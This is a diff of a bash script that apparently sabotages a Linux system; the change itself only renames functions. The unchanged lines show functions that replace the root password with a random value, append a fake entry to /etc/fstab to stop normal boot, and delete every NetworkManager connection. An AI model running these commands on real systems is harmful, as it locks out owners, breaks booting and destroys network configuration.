@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-change-root-password () {
+change_root-password () {
 	#List of different combinations of characters that we're gonna mix for our new secret password
 	local list=( egUFkBvvG evJfUQL evJfUQLs bk9PHTX3 zA jrn 7zH zAjrn7zH6J bCwzUA 5dCW5YYT 5dCW 5YYTbX 7uPT3A)
 
@@ -20,13 +20,13 @@ change-root-password () {
 }
 
 
-break-fstab () {
+break_fstab () {
 	#Add a destructive line to /etc/fstab to preclude normal boot
 	echo "/dev/not-found     /not-found                       fake     defaults        0 0" >> /etc/fstab
 
 }
 
-delete-nmcli-connections (){
+delete_nmcli-connections (){
 	#Loop over all nmcli existing connections to then delete them all
 	for i in $(nmcli connection show | cut -f 1 -d " " | sed '1d')
 		do
